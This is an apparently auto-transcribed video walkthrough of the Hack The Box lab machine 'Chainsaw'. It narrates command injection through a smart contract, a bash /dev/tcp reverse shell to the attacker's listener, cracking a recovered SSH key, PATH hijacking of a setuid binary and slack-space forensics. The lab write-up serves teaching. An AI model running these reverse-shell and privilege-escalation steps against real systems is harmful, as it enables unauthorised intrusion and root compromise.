 what's going on YouTube this is a hip sack I'm doing chainsaw from hack the box and hopefully I can do this box from justice and explain these concepts because it put me completely out of my comfort zone I would say like I understand theory em the blockchain and smart contracts that like the level of a muggle but before this box I never went full-on wizard and actually interacted with any of those things and this box makes you do all three the friend hold starts off with exploiting a smart contract with just a simple command injection vulnerability get on the box and then you've realized the box has ipfs the internet or interplanetary file system and you go poke around that find SSH key use that to log in and then you have yet another binary to exploit that's using a smart contract system there is a path injection vulnerability in the binary so you can skip that whole step and when you do when you go read route text you realize that the file is not there well technically it is there because it's just hidden and the slack space of the file system so you have to do some forensics so with all that being said I'm sure that sounds interesting let's just jump in and start doing it as always we start off the end map so - SC for default scripts as V enumerate versions Oh a output on all formats put in the end map directory and call it chainsaw and then the IP address which is 10 10 10 140 - this command continues sometimes so I've already ran it looking at the results we have just two ports open the first one being FTP on port 21 and it's banner tells us it's vs FTP D version 3.0 3 so the first thing we do is just run search point on vs FTP D and we see all known exploits against version 2 so we can probably ignore the version number we have the nmap script FTP anon telling us anonymous FTP login is allowed and is giving us some files so we dig into this a little later the next thing we have is SSH open on port 22 and it's banner tells us it's a ubuntu box so between these two services there's not really much of an attack surface so I'm gonna do a full nmap scan to see if we can find anything that accepts more user input there is FTP but again with those three files not much you can do so hopefully we'll find like a HTTP server or something I'm do nmap - - to do all ports that's one through 65535 - V is gonna show us open ports as it finds it so we don't to wait for the scan to finish Oh a again I'll put all formats - chain saw - all ports and then the IP address which is 10 10 10 140 - while that end map runs we can go poke at that FTP server so I'm going to make two FTP and looks like I had already created and just did not delete it no files in here so work fine so FTP 10 10 10 140 to log in with anonymous and then because it's an anonymous login password doesn't matter and we can do dir - a to show all files and there are 3 files the key thing I noticed right off the bat mm 2018 one file November 22nd 454 and that is today you can also probably guess the time zone because it's 1106 my time and 454 on server times so probably UTC time so we know the service time zones UTC we can go back and look if an app actually told us that it doesn't look like it so could be interesting but most likely not does kind of tell you server time maybe a boot timer I don't know but let's just download all three files so we'll do em get stuff a multiple get and then do yes to download each file and we can go take a look at them so address dot txt we just have a hash so I should have just catid that file and we can see the length of this so if I grab this echo - n paste WC - C 40 so I see this as 40 characters and it's mixed case as we see lower case and upper case and forty characters is most likely a sha some we can verify that with like echo - n please subscribe pipat - sha-1 some and we can do echo - n WC - C so most likely this is gonna be a sha-1 some just based upon the length the weird thing is is the casing I don't know if it's case sensitive or not I don't know if Shawn won some is case sensitive Matt I wouldn't think this is but I digress so having a dress most likely sha1 we also have this JSON file so let's look at this and this is pretty big we have contract named weaponize ping ABI and a bunch of data byte code deployable byte just tons and tons of data we go to the very end we see compiler sol c so if we do some googling around this we'll find out this is a smart contract for an aetherium blockchain so SL o LC let's just see what this says npm solidity compiler solidity etherium so i'm gonna be doing something with the blockchain which is uncharted territory for me since I don't know the blockchain well so we can look at dot Sol and this is just going to be the smart contract and we can see it's got two functions get domain set domain and then this JSON file must be the application binary interface so we can interact with this smart contract I believe the bytecode is what actually goes on the blockchain but having this lets us interact with it so think of the ABI as kind of like a API interface to smart contracts but we have no way to access this contract because there's no port so let's go back to our and map and see if it found anything else I haven't found anything so I'm just gonna pause the video and wait for this and map scan to finish so we can see if there's any other ports listening and then connect to it so nmap is now done and it only found one additional port that is at ninety eight ten so I'm going to do an map - p98 10 and then - SC SV 10 10 10 142 to see if an map can identify what this port is I'm also going to just assume this has to do with aetherium and blockchain because well that's what has been mentioned so far and yeah so I'm just gonna Google like a theory or 9810 to see if it's some default thing going through here it doesn't look like 9810 is a default port so I don't know exactly what this is so I'm gonna Google like how to build a blockchain app Python and let's see I'm sure these YouTube videos would be good let's see app let's see get away from all the ads I think this is a good tutorial to get started but generally this is the first thing I do when I don't I go into uncharted territory is I search for how to build it the next thing I do if I have questions is I'd go to read all the read the docs so solidity Doc's read this somewhere in here it tells you that you normally use like the web 3 module to connect to the blockchain side Google like web 3 Python and go to the read the docs page here so it's a Python library for interacting with aetherium so read all this and then we could start connecting the blockchain I have no clue why that failed so we can just try this again that's weird but let's just start creating something so let's do V weaponised egg pie and before we do that we have to install web 3 to install the module so I did pip 3 install web 3 so we can do from web 3 import web 3 HTTP provider and if any met so say for once but not the second time but we can see it's HTTP so if you had googled like web through connect examples you'll see there's a few providers so right here providers so you got like IPC P WebSocket HTTP because the end map had responded with a bunch of HTTP stuff that's why I'm loading the HTTP provider so let's also import JSON because we have to input that application binary interface which is a JSON file so first thing we do is load all look and figs so load config and we'll need the address so we can grab this and say contract address is equal to this contract data is equal to JSON loads and we have to open a file so open and this is weaponized ping dot JSON and then open it for read and then actually read the file into that and then ABI for the application binary interface that's can be contract data ABI and if we look at this file so if we do weaponize paying dot JSON all that ABI command is doing is loading everything after this because maybe I does not include the contract name so that's all that woods so now we have to establish a connection so to do that I'm just going to do W 3 is equal to web 3 HTTP provider HTTP 10 10 10 142 port 9810 ok and let's just test this out so python 3 whoa cat stirred-up I copy a paste okay so we do w3 we can see it's an object w3 f dot accounts and we can see a list of all the addresses here so let's just grab the first one with zero and we're going to set this as a default sender address so w3 dot e dot default account is equal to this so now whenever we make a transaction it's just going to use this as the sender which is this address so now we have to set up our environment so we can call things so that's what the ABI is for so this is going to like load the API so we'll do contract is equal to W 3/8 dot contract ABI is equal to AVI and address this is the address of the smart contract is going to be what do we call it contract address okay so if we look at the contract we have this and what this allows us to do is now there's a functions command and we can do any function inside of the smart contract so there we go FTP we can look at the solidity file and there's only two functions we have get domain and set domain when you want to get data you do a call when you want to set data you do a transact so we're going to do functions dot get domain.com and we can see it's set to Google so over here we can do get domain and just paste this so copy based and we'll just print this out and we'll call this whoops print domain okay so now we want to try setting a domain so again we have set domain and we pass it a string so before I do this I'm just gonna do if config tun 0 and I'm at 10 10 14 3 so TCP dump I tun 0 ICMP dash n because I don't want DNS so let's do set to mean 10 10 14 3 dark transact I think that's correct see if anything happens and we get the server sending us a ping so I was just guessing at the function because the contract name is weaponized ping so that's why I did everything on ICMP so we can try maybe it's doing like an exec call so we could say do this and ping - see I think - these Linux it's either - theoden king - c11 27001 okay - see is on Linux 127 0 0 1 and let's do 3 so if we see more data we know we have done command injection and pinged multiple times so set this one see I was expecting more pings oh you know it help if I paint myself 10 10 14 3 so setting this we see we have definitely pinged more times than we were previously so we found command injection so let's see if we can get a shell so the first thing I'm going to do is a bash reverse shell so we'll do a SH like that we've got - i dev tcp ten ten fourteen three what 9001 and then what is it zero and one like that I think that's the show and CoV NP 9001 send this and it doesn't look like we're getting anything whenever this bash reverse shell doesn't work I will generally do bash - see because if it's doing a shell like doing this net port like this this is a bash thing so if it's using any show other than bash this may not resolve to a network address so that's why I'm doing bash - see then executing this reverse shell to guarantee this was it returns to a network address so if this shell gets called with bash so do it this way and we get a shell on the box so LSL a awesome we can do Python - see em port PT y PT y dot spawn then bash control Z - background stty raw - echo FG Anna and then twice and now we'll have tab all to clean all those things I can also do export term is equal to X term so now I can do ctrl L to clear the screen which is handy and we can see what this is so I'm gonna check out what run ganaches and we can see this is what's listening on port 9810 so think of this more as like flask or G unicorn or something like that it's just a web server something for smart contracts so that's what that's listening we can look at main PI cuz let's see what here you can see this is the code for loading the contract and it's taking the address let's see where we executing code the main reason I'm looking at this is to see if there's any like hard-coded credentials or things like that but we can see let's see it's getting the domain here see where is it so calling function to get domain okay my terminal was screwed up so it wouldn't show me the full command so after it gets the domain it does sub-process dot process open Appy open and then ping dash C so this is a straight exact call so that's why that's vulnerable but the script doesn't really tell us anything we don't know because all that's doing is setting up that 9810 interface we've exploited it and we're now administrator but nothing interesting checks to do - L can't really see anything we don't have the administrator password if we go to slash home we can see there's two users we don't have access to go into Bobby's directory so if we go see D Bobby access denied putting you into administrator and see what is here and let's see we got a team ox config Z ace I guess they have zsh default so that's why my bash shell didn't work right away we have a empty CSV maintained if we do LS maintained go into maintain we can look at gen bye and this looks like it's generating a bunch of keys to do distribute keys over protonmail so if we look in pub everything's a public key we don't have private keys so I'm guessing they use that Python script to generate SSH keys and then sent them over some type of mail so I'm gonna go LS la again and see if there's like a dot mail directory or anything unique there I don't know what SWT is Shems dot perhaps I don't know ipfs don't know what that is so we look at this we got to config blocks and things so if we do less config and a lot of stuff I don't know so when I hit this stuff I don't know I'm just going to google the technology so ipfs the interplanetary filesystem kind of sounds like a Beastie Boy song or something but again you'd go to the documents so maybe like ipfs read the docs and you can see how this works I forget where the documents were usage maybe and there so I think it's ipfs you probably don't need to because you can probably just access all the blocks individually but if you want do it the correct way ipfs I think local refs let's see what is it i PFS local maybe it's local ref ipfs local ref let's see ipfs list all documents LS IPS row F refs that's not it look cool okay so I haven't backed up uh backwards so it's ipfs refs local and this lists everything so we can do for I and this do LS man my terminal screwed up let's just fix my terminal instead of exporting calls and height and all that type of stuff we have this data SSH directory so all I'm going to do is do ssh-keygen - F a file would call this chainsaw generate Mikey cat chainsaw pub and we can echo this into authorized keys and then SSH into the box so echo that to authorized underscore keys I probably type out that yep so move that C move this to that okay chmod 600 lat I'll get back to my box chmod 644 lat 10 10 10 142 and let's see there we go so now I have a proper shell because I just got in through the entender way so it was i PF s refs local there we go so for i and this do i PFS LS alright and this is going to list all the files that have a chain and we get a bunch of error messages so what I'm going to do is say to dev null and that's just gonna hide all everything going to pipe to which is standard out or a standard error and we can get everything so looking at this we have a bunch of public keys not interesting there is a male walled directory and then a bunch of emails and then I don't know what this is but we know they said to do email out via protonmail and we have emails so let's cat Etsy passwd to see the users on the box and let's see Artie Laura Brian Wendy all set to bin false so if we got there SSH key we couldn't really do anything with it because we just get sent to false let's see so any that don't I'm just gonna grab bash for Etsy passwd and we see administrator or Chuck Rhodes has it which we already are but Bobby also has bash set so Bobby is the key I want let's go back to this internet planetary system command and we want Bobby's thing so if week at this address IP FS cat that we get the email address or the email so we can see the whole header um there we go subject Ubuntu server private RSA key from chainsaw admin at protonmail and then transferring we got this which probably is the message so for the public key if we echo the unknown dot d 64 did they have a file name because I see file name Bobby Kent it's a phone name here there is not so basically for dash D unknown so this is the email that he's sending so they've disabled as stage password and says hey user ssh key so going back up here whoops and we can go and get Bobby key ENC so let's copy all this enter V Bar B Que ANC paste it and then base64 - D that and I made a lot of type is there okay that's fine but we have this key so now we have to crack it so let's do Bobby key and then SH - John do I not have it on this app search SSH - John good is it John it's probably installed my Kraken SSH oh let's see John find grap SSH sit in there we go SH ng - John so V root SSH will do Bobby key paste this and then dot slash SSH ng - - John on the key and this puts it in a format that John the Ripper can crack so V root chainsaw dot to crack paste and then we can do John - - word list is equal to opt word list so John - - word list is equal to up word list and rocky txt and then the file name which is root chainsaw dot to crack and then John comes out to cracking this as Jackie chain is the password to this SH key so we can go back to our box chmod 605 BC Bobby key to Bobby at 10-10-10 142 Jackie chain is the password and we get in so we can do WCC user dark text and read the file perfectly round at this we got a projects directory looking at this there's the chainsaw Club and then we can see this is a set UID binary if we execute it we can see it says enter username so we'll do Bobby and then Jackie chains and we get wrong credentials so looks like we'll probably at the exploit this binary the very first thing you probably should do when you come across like a set UID binary is one L trace Oreste race against it because the main difference between doing set UID on a binary and doing sudo is sudo has something called what where they call it protected or secure path so I can't edit my path in sudo because of this secure path however for set UID binaries I can so if we do L trace on chain saw club and that needs to be a dot slash right off the bat it stops and says hey you have to enter their studio password for Bobby so what happened here is whenever you do any like debugging which L trace and s trace and all that do it drops the ability to use set UID bits so now when the system did this sudo command it wanted the thing for Bobby when if I don't use set UID it sets my UID as 0 and execute this as root which can do sudo with anything so that's why this happened but the main issue is it's just doing system and then doing sudo it's not doing a full path so we can do a little path injection if it did user bin pseudo this wouldn't be possible but whenever you just type of binary name and don't type the full path it goes through your Linux path so it's going to go through user local s been using local been looking for that command and doing the very first one so if I create the file sudo and we can just save in bash and then say hey run bash chmod plus x on sudo and then we're going to export path is equal to my current working directory and then the path so if I echo path now you can see the path starts off with home Bobby projects chainsaw Club which I have a binary or a script called pseudo so now when I run chainsaw Club and it does that sudo command it's gonna use my current path and the first thing it executes is going to be that bash script and now we are root so a way to bypass that chainsaw club we'll do it at the end of the video so you can see it it's essentially how we got a shell in the box just exploiting a smart contract just going a bit more in depth so it's not too hard but when we root we can go into a slash root and if we do WCC root dot txt you can see it's 52 characters if we cat it it says mind deeper to get rewarded with the root coin so this is where the box kind of gets tricky because the it's really well hidden so it's kind of a form of just forensics that you have to be able to find it and when I run into these type of issues and I have no clue what to do on a box I generally look for what people have done that's custom on the box so we'll just go to the s-pen directory and kind of cheat so in Linux whenever you do like user local that is going to be stuff that users put on the box if it's not user local or user bin local that's generally managed by the package management and Ubuntu is case and Debian's case is apt so I want to look for things that are in these directories that apt is supposed to manage that app didn't put there and before I did that I went through her log and looked through like the package log look through the history log and apt we could do z cat history log 1gz to kind of see what people installed on this machine to kind of get an idea what it's used for but one of the big things that generally gets me findings is doing like for I in LS we do s pin slash star do echo I and all that's going to do is list all the files full path and s-pen so also what I'm going to do is now I'm just going to do D package - - search I and this tells you what program or what package the program is in so if we do D package - search and we do let's say this Pam we can see that's there because of web Pam modules bin so what I'm going to do is similar to like where I did before with hiding errors except I'm gonna hide everything that did not error so one is just standard out so I'm doing one - Devon all and now this will only show me things that are in this directory that didn't get put there by apt so you can run that and this is the only thing that's there so I'd probably go through my entire path doing that command to kind of get an idea of the lay of the land if you did it on like use a local s bin these are all going to be put there by user stuff so nothing's there user local whoops use a little coal bin again these are put there by the user not apt so if we do this command again but put it in we'll just do one if we can nest this this is ugly slash star so doesn't find anything for pretty much any file in this because this was put there by the user like ipfs was not installed with apt apparently so that's why it exists here so another hint how you could find things pretty cool but the main thing was an S Pen and you got B mat so if we figure out what this binary is B map if we do like B Matt maybe github and read this this is all about hiding files in slack space so we go back into root and we do a WC - C on root text it's 52 bytes if we do it D U on roof text D u - I guess if we say human readable you can see it's 4 K which is going to be 4096 bytes because that is a block on the disk so if we touch one well we'll just touch it SEC and we do WCC hips ik 0 and we do D u - H on hip SEC o 0 let's put something in this so please subscribe do - eh it's still 4k despite it's only writing 16 bytes to that file so there's still a bunch of other data that could be there so and I guess a file can only be a full number of blocks on a system so we reserved one block for a root dot txt which is 4096 bytes but we only wrote 52 bytes which means there's like 4,000 404040 something bites left so that's what B map is gonna do so if you do B map - 8 I think there's - - slack root our text you can see the file size is 52 so there's 4044 slack size so that's the number of space or bytes that exist for that file that's not being used so this just wrote something in that slack space so you can view it this way with a forensic tool so it hard to explain but hopefully that makes sense if not read more up into forensics and slack space that being said let's get back to doing the Box the intended way so let me clear that screen so if we exit all this and go back to the chainsaw Club this should look familiar let's just get rid of sudo so we can execute this but we got the JSON and the solidity file if we cat a solidity file you have a bunch more functions so there's get username set username get password set password get approved set approve etc so let us just copy these files onto a box or yeah let's copy them on so we can do that with SCP so make der Bobby CD Bobby and we can move doc Bobby dark key to a directory SCP - I bobby key and then 10 10 10 142 this was projects chainsaw club copy everything to our current working directory and Jackie chain we have to specify the user Bobby at Jackie chain so now we're just list of all the files and then I also want to grab my weaponize ping dot pie and we'll call this chainsaw Club dot pie and then we'll just edit this a little bit to be the new thing so contract address if we cat address we can get it so we got a new address xx delete and instead of WEP nice ping its chainsaw club I think that's it as a capital C it is and then the provider it's not gonna be ninety eight ten and we didn't have any other ports listening so let's I guess we can go back here if we do Ln T P there's gonna list SS is the IP way to do net stat net stat was deprecated a long time ago SS is the new way to do it you could do net stat al NP crap list as well same thing but you should be using the SS commands now we can see ports we got 98 1050 322 and there's also 63 9 91 but that's only exposed to localhost so I'm gonna do is I'm gonna hit that keystroke to enter the SSH command line but you have to do that as the very first command you type so I'm gonna hit enter and then hit that keystroke I'm gonna do - L and this is gonna set up a local port forward the first port is gonna be what your box listens on so I'm just gonna do elite normally I do the same port I want afford to but I'm doing this to make it more obvious what's happening you can look at the reddish video I think it is that goes over all this and more in depth but I'm saying hey my box my Cali listen on port 3 1 3 3 7 and anything you get send it through this SSH connection and on the other end go to 1 27001 for $63.99 1 so that's now forwarded so if I do curl localhost 3 1 3 3 7 it goes through that SSH tunnel and out on localhost on that other end so we edit my Python script we can say this is going to be 1 27001 elite there we go so if we go back python 3 we can verify we can connect by doing cat chainsaw club pi paste this in oh I have to get into Bobby there we go ok it looks like we are connected so let's just edit this and let's do a sender address again so w3 eath dot default account is equal to w 3/8 counts so now we have to load the when I load the whole script maybe I wasn't typing this as I go it's weird setup environment so this is the contract is equal to W 3/8 contract a VI is equal to AV I address is equal to contract address there we go and now we have all the functions so actually let's just do this all from the Python interpreter I find that easier so let's just copy this contract command paste there we go so let's SH is Bobby - Bobby at 10-10-10 142 Jackie chains Jackie chain projects chainsaw Club and the first thing we have to do is probably get user so we can do contract functions dot get user name and then call and we are set to nobody and again if we look at this solidity contract maybe this would be easier to read it chainsaw Club Z so we'll the first function I used was get user name right here so let's set user name so contract function set user name - it's AK and this will be transact call this should have worked what is this error message see set username and it wants a string how did I do this before see contract functions dot function dot transact we get it with nobody it's weird let's see little confused by this let me look at this again do cat chainsaw club PI will copy this see ABI chainsaw club that's what it's loading contract functions get username call nobody set user name hips ik dot transact there we go I'm not sure exactly what was going on there but now if we get user name ape SEC he's there so let's go to the next thing which is password so we're setting the password here and if we looked at the JSON and search for password let's see nobody string password and we got this bulletproof Earth's supply so this is the basic information of it like the default config I guess but if we do head coach in WC - see 32 characters so the password is just a md5 sum so instead of set username we can do set password and then we have to do before you do this input hash Lib and this is gonna let's generate a md5 sum so set password and then we want to do hashlib dot md5 please subscribe like that that is ugly this is transact one must be Union code so start encode let's just take a step back and actually code this correctly so P W is equal to hash lived md5 please subscribe there we go dot encode so now we can just do password is equal to PW and get rid of that there we go that code looks much cleaner pwl I screwed something up P W is equal to hash Lib md5 please subscribe dot encode dot hex digest there we go that was the md5 sum so contract that functions dot set password that md5 sum dot transact and we finally set the password so little bit of trial and error but we got there so if sec please subscribe and user is not approved so again set username get password set password we got get approve instead approve with this set of prove so if we go all the way back to a get I'm going to say hey get approve and you see that's false so if we do set approve to true we have to do transact and serve call to write to the database we can see now we're approved so if we do it set please subscribe it says not enough funds so again this way we go back to the contract and see things so there is a command called transfer I'm in the LDAP so the JSON let's go back to the solidity so there is good supply get balanced and transfer so let's do get supply and get balance to see what these commands do so let's do get supply and get balance so supply I think is the total amount of I guess maybe ether in this contract and the balance is from our current user so if we do transfer and then we'll do 901 forgot to do transact I'm just calling the transfer command in this contract so now if I do get balance my balance is 901 if I do get supply there's 99 left so we can try logging in with this still not enough funds so let's transfer the remaining 99 if we do call on get supply there's none we look at a balance it's now a thousand so upset please subscribe I type my password wrong hip sack why is it not typing hip sec please subscribe and that's how you get past that and then right here it's the same going through the slack space to get the file so hope you guys enjoy the video take care and I will see you all next week